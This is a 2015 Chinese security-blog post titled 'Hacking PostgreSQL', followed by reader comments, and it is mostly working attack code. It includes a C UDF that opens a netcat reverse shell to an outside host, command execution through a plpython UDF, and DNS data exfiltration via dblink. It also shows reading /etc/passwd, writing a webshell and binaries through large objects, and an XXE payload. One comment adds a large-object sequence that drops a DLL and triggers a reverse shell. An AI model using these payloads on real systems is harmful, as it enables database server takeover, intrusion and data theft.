@@ -1,0 +1,57 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Hacking PostgreSQL</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Ricter</a> <span class="bull">·</span> <time title="2015/06/04 10:16" ui-time="" datetime="2015/06/04 10:16" class="published ng-binding ng-isolate-scope">2015/06/04 10:16</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>这篇文章主要讲解了如何 Hacking PostgreSQL 数据库，总结了一些常用方法。</p><h1>0x01 SQL 注入</h1><hr><p>大体上和 MySQL 差不多，有一些变量不一样。具体就不再举例，可以看这篇总结：<a href="http://www.sqlinjectionwiki.com/Categories/4/postgresql-sql-injection-cheat-sheet/">PostgreSQL SQL Injection Cheat Sheet</a>。<br>此外，利用 sqlmap 也是一个不错的方式。</p><h1>0x02 执行命令</h1><hr><h3>C</h3><p>sqlmap 给出的几个 UDF 在我本地测试并不成功，所以最好的方法是自己编译一个动态链接库。<br>根据官方文档，我们要定义一个 PG&#95;MODULE&#95;MAGIC。在 PostgreSQL 这个是为了 Postgresql 的安全机制（大概？），在 8.2 以后需要验证这个 magic block，不然，在加在动态链接库的时候会报错：</p><pre><code>ERROR:  incompatible library "xxx.so": missing magic block
+HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
+</code></pre><p>执行系统命令的动态链接库源码为：</p><pre><code>#!c++
+#include "postgres.h"
+#include "fmgr.h"
+#include &lt;stdlib.h&gt;
+
+#ifdef PG_MODULE_MAGIC
+PG_MODULE_MAGIC;
+#endif
+
+text *exec()
+{
+    system("nc -e /bin/bash 10.211.55.2 9999");
+}
+</code></pre><p>利用如下命令编译 .so 文件：</p><pre><code>#!bash
+gcc 1.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so
+</code></pre><p>在 pgsql 里执行：</p><pre><code>#!sql
+CREATE OR REPLACE FUNCTION exec()  RETURNS text AS  '/tmp/1.so', 'exec' LANGUAGE C STRICT;
+select exec();
+</code></pre><p>监听的 9999 端口得到一个 shell：</p><p><img alt="" img-src="f606e17f510e2638c774cc6f1f14dfee056d4810.jpg"></p><h3>Python</h3><p>默认 PostgreSQL 不会安装 Python 的扩展，在 Ubuntu 下可以通过：</p><pre><code>#!bash
+apt-get install postgresql-plpython-9.1
+</code></pre><p>进行安装，除了 python 的扩展，还有 sh、perl、ruby 等等。<br>安装完成后，首先是创建一个 UDF 来执行我们要执行的命令：</p><pre><code>#!sql
+CREATE FUNCTION system (a text)
+  RETURNS text
+AS $$
+  import os
+  return os.popen(a).read()
+$$ LANGUAGE plpython2u;
+</code></pre><p>其中的 plpython2u 可以利用如下语句获取：</p><pre><code>select * from pg_language;
+</code></pre><p>我们可以根据返回来判断利用哪个语言（plpython2u、plpythonu、plpython3u 等等）。</p><p><img alt="" img-src="1f5963beb826185e0cf0f373f2ee97721717f5e0.jpg"></p><p>创建好 UDF 后，直接调用如下语句即可：</p><pre><code>#!sql
+select system('ls -la');
+</code></pre><p><img alt="" img-src="4549e44933c4c77d0dc753342b8801fe33e624ca.jpg"></p><p>此外，sh、ruby 等同理，可以参考官方文档来写一个 UDF。</p><p>文档地址：<a href="http://www.postgresql.org/docs/8.2/static/server-programming.html">http://www.postgresql.org/docs/8.2/static/server-programming.html</a></p><h1>0x03 DNS 请求获取数据</h1><hr><p>同样的，PostgreSQL 可以通过 DNS Request 一样获取数据，在盲注的情况下。用到的一个扩展叫做 <code>dblink</code>，可以通过如下命令开启：</p><pre><code>#!sql
+CREATE EXTENSION dblink
+</code></pre><p>接着运行如下语句，获取当前数据库用户名称：</p><pre><code>#!sql
+SELECT * FROM dblink('host='||(select user)||'.f27558c1f94c0595.xxxxx.xx user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT);
+</code></pre><p><img alt="" img-src="3eb7f328674bb3d7255e169ec9b8bfe355142334.jpg"></p><p>远程获取到请求内容：</p><p><img alt="" img-src="7129e53865fa097c2f03e2f8dc66bc56791bfb30.jpg"></p><h1>0x04 读写文件</h1><hr><h3>读</h3><p>PostgreSQL 读取文件虽然有些蛋疼，但是还是可以读取的：</p><pre><code>#!sql
+CREATE TABLE temptable(t text);
+COPY temptable FROM '/etc/passwd';
+SELECT * FROM temptable limit 1 offset 0;
+</code></pre><p>读取结束后：</p><pre><code>#!sql
+DROP TABLE temptable;
+</code></pre><h3>写</h3><p>写文件分为两个部分，一个是写 webshell，另外一个是写二进制文件。<br>写 webshell 十分简单，利用：</p><pre><code>#!php
+COPY (select '&lt;?php phpinfo();?&gt;') to '/tmp/1.php';
+</code></pre><p>即可写一个文件。<br>根据疯狗的这一篇帖子：<a href="http://zone.wooyun.org/content/4971">http://zone.wooyun.org/content/4971</a>，说是可以利用 PostgreSQL 的“大对象数据”来写，但是我测试是失败的。报错如下：</p><pre><code>#!bash
+ERROR:  pg_largeobject entry for OID 2008, page 0 has invalid data field size 2378
+</code></pre><p>用 COPY 的 FORMAT 位 binary 来写文件的话，会被 PostgreSQL 加上几个字节，导致不能识别为 ELF 文件。<br>实际上，阅读官方文档可知，写的文件每一页不能超过 2KB，所以我们要把数据分段：</p><pre><code>#!sql
+SELECT lo_create(12345);
+INSERT INTO pg_largeobject VALUES (12345, 0, decode('7f454c4...0000', 'hex'));
+INSERT INTO pg_largeobject VALUES (12345, 1, decode('0000000...0000', 'hex'));
+INSERT INTO pg_largeobject VALUES (12345, 2, decode('f604000...0000', 'hex'));
+INSERT INTO pg_largeobject VALUES (12345, 3, decode('0000000...7400', 'hex'));
+SELECT lo_export(12345, '/tmp/test.so');
+SELECT lo_unlink(12345);
+</code></pre><p>其中每一段都要小于等于 2KB，这样就可以成功写入：<br><img alt="" img-src="9d34d9704e598d92bcce42977d9a5d4124105102.jpg"></p><h1>0x05 XXE</h1><hr><p>老版本的 PostgreSQL 存在 XXE 漏洞。具体可以看这篇文章：<a href="http://lab.onsec.ru/2012/06/postgresql-all-error-based-xxe-0day.html">PostgreSQL (all) error-based XXE 0day</a>。<br>大体就是执行语句：</p><pre><code>#!sql
+select xmlparse(document '&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE content [ &lt;!ENTITY abc SYSTEM "/etc/network/if-up.d/mountnfs"&gt;]&gt;&lt;content&gt;&amp;abc;&lt;/content&gt;');
+</code></pre><p>可以获取一些数据，也可以进行 SSRF 等。不过因为年代很久，可能很多都修复过了，所以作为一个保留方案，可能会有意外的惊喜。</p><h1>参考</h1><hr><ol><li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">PostgreSQL SQL Injection Cheat Sheet</a></li><li><a href="http://zone.wooyun.org/content/4971">关于PostgreSQL的那些事儿（文件读取写入、命令执行的办法）</a></li><li><a href="http://www.postgresql.org/docs/9.0/">PostgreSQL 9.0 Documentation</a></li><li><a href="http://lab.onsec.ru/2012/06/postgresql-all-error-based-xxe-0day.html">PostgreSQL (all) error-based XXE 0day</a></li></ol><p>最后，如有错误请不吝赐教。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ricter</span> <span class="reply-time">2015-06-07 23:38:07</span></div><p></p><p>@懒懒滴1994 自己写的，求指出</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2015-06-06 16:08:52</span></div><p></p><p>0x03 DNS 请求获取数据</p><p>测试这部的时候，如果提示</p><p>exampledb=# create extension dblink;<br>ERROR: could not open extension control file &quot;/usr/share/postgresql/9.1/extension/dblink.control&quot;: No such file or directory</p><p>则需要<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6b1904041f2b000a0702">[email&#160;protected]</a>:~# apt-get install postgresql-contrib-9.1</p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1b6b74686f7c697e685b707a7772">[email&#160;protected]</a>:/root$ psql -d exampledb -c &quot;CREATE EXTENSION dblink&quot;<br>CREATE EXTENSION</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懒懒滴1994</span> <span class="reply-time">2015-06-05 13:25:18</span></div><p></p><p>请问这是翻译过来的文章么？有几处小错误- -</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2015-06-05 12:32:41</span></div><p></p><p>@zcgonvh 为何那么屌</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-06-05 12:12:03</span></div><p></p><p>@zcgonvh 不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2015-06-04 20:53:22</span></div><p></p><p>写的真好，我还说为啥不直接用libc里的system呢，原来高版本有magic block了，按照我国《刑法》第285条相关规定,我只能又默默的打开了https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition 虚拟机，开始了意淫。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ricter</span> <span class="reply-time">2015-06-04 13:28:54</span></div><p></p><p>@zcgonvh 反弹shell还是UDF，读文件这个蛮不错的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zcgonvh</span> <span class="reply-time">2015-06-04 13:01:15</span></div><p></p><p>文件操作用lo那一套就可以，copy和adminpak都是废物。<br>读文件：<br>select lo_create(12345678);<br>Select lo_import(&#039;c:/windows/system32/cmd.exe&#039;,12345678);<br>select array_agg(b)::text::int from(select encode(data,&#039;hex&#039;)b,pageno from pg_largeobject where loid=73957 order by pageno)a<br>去掉逗号花括号，然后winhex里面ctrl+b。</p><p>写文件可以用非公开函数lo_open、lo_lseek、lo_write，insert挺蛋疼的。<br>例如注入点直接反弹shell：<br>select lo_open(OID,x&#039;60000&#039;::int);<br>select lo_lseek(0,0,2);<br>select lo_write(0,decode(&#039;4d5a90000300&#039;,&#039;hex&#039;));<br>Select lo_export(OID,&#039;1.dll&#039;);<br>Select lo_unlink(OID);<br>Create or replace function test(text,int) returns int as &#039;1.dll&#039;,&#039;GetResvShell&#039; language c;<br>Select test(&#039;192.168.1.10&#039;,8888);<br>记得以前做过总结，等下找找发到zone。</p><p></p></div></div></div></div></div></main>
